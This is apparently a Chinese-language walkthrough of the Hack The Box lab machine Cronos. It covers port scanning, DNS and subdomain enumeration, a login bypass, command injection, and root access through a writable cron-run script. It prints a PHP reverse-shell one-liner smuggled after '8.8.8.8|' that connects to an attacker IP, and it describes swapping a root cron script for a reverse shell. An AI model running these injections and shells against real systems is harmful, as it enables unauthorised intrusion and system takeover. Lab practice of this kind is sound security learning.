## nmap

```Bash
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

```

```Bash
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



## 80

目录扫描没有找到有用的东西



## 53

查不到任何解析记录

尝试UDP扫描，也只有一个53端口

找了下exploitdb，只有DNS投毒类的poc

反向解析不成功，是因为没有指定正确的nameserver，没有把10.10.10.13放到第一位上

```Bash
└─# cat /etc/resolv.conf
nameserver 10.10.10.13
nameserver 183.60.82.98
nameserver 183.60.83.19

```

```Bash
└─# dig -x 10.10.10.13

; <<>> DiG 9.18.6-2-Debian <<>> -x 10.10.10.13
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18874
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;13.10.10.10.in-addr.arpa.      IN      PTR

;; ANSWER SECTION:
13.10.10.10.in-addr.arpa. 604800 IN     PTR     ns1.cronos.htb.

;; AUTHORITY SECTION:
10.10.10.in-addr.arpa.  604800  IN      NS      ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.         604800  IN      A       10.10.10.13

```

拿到域名后进行子域名爆破，得到2个新的页面

子域名爆破两个方法： gobuster 或者 nmap

![](https://secure2.wostatic.cn/static/6M88eozm86k1fsdmbzr4g7/image.png?auth_key=1677499839-uRJDuq9u7t46UB14aMicaM-0-886a6b4507d879b30a07e09392b1ddb8)



> 子域名爆破详解 [Gobuster for directory, DNS and virtual hosts bruteforcing | - erev0s.com](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/)

```Bash
┌──(root㉿walle)-[/home/machines/linux/cronos]
└─# gobuster dns -d  cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -t 50                                                                                                               
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     cronos.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
===============================================================
2023/01/04 15:16:52 Starting gobuster in DNS enumeration mode
===============================================================
Found: www.cronos.htb
Found: admin.cronos.htb
Found: ns1.cronos.htb
Progress: 23043 / 484700 (4.75%)^C
[!] Keyboard interrupt detected, terminating.

```

www.cronos.htb 介绍laravel，没有什么用

admin.cronos.htb

![](https://secure2.wostatic.cn/static/bP9B37ionYW7KAAo2xcH8h/image.png?auth_key=1677499839-2wyTndhLNEjH2R11SUjvhJ-0-17223d8fd2529b8653544c9c64f81bf1)

万能钥匙进去，但是这里怎么判断是要用万能钥匙？ 这里倒是可以用sqlmap爆出很多信息



进去后拿到一个RCE的界面，这个界面比较奇怪，每次只能触发，一次，不能重复触发

用 php反弹拿到shell

```Bash
8.8.8.8| php -r '$sock=fsockopen("10.10.16.11",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```



## 22

版本命中一个扫描类的poc，没有什么用



## privilege escalation

没有发现什么有用的东西，

- ubuntu16.0.4 + kernel 4.4.0直接exp提权

    尝试多个poc，在靶机上缺少库文件



- linEnum.sh

```Bash
# 在cron中发现一个定时1min脚本，root权限
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

直接尝试把脚本内容替换成php的反弹shell，等待执行时间到，拿到root shell



## beyond root

- 使用pspy32探测下定时任务

![](https://secure2.wostatic.cn/static/tAUFCVxpK7L4HP7RPoA4WJ/image.png?auth_key=1677499839-akCjaJp9FGhpnY3cJBf1Fb-0-481a5ada7ac8b7ca99cf4ffdc7cbfa5a)

- 对比下linpeas.sh 的区别，结果显示上更友好一些。

![](https://secure2.wostatic.cn/static/8KUWgio5T6SMZQdfjGLoDc/image.png?auth_key=1677499839-wVfTFG4gwXCcEjebvPkVz6-0-f8ace694fabaaa864538ad0c6b269839)

